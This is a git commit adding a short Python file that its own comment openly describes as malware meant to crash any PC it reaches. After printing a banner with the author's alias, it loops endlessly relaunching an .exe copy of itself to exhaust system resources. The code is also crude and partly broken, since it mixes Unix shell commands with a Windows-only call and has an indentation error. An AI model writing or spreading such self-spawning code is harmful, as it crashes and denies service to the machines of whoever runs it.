0de13e36013fc7f985c553d9d791db8484a9087c
Hackexdecodebreaker <96276503+Hackexdecodebreaker@users.noreply.github.com>
2025-01-10 02:49:43 +0000

    Add files via upload

---
+++ main.py
@@ -0,0 +1,11 @@
+ #Yhis is a malware to crash any pc it gets it hands on by opening itself for as many times as possible
+import os
+
+os.system("clear")
+os.system("figlet                              Xkeyxxx")
+os.system("echo Author:HackexDeCodebreaker")
+os.system("echo Alias:Xcyberex")
+os.system ("echo Date:January 8,2025")
+
+ while True:
+     os.startfile(__file__[:-2]+'exe')
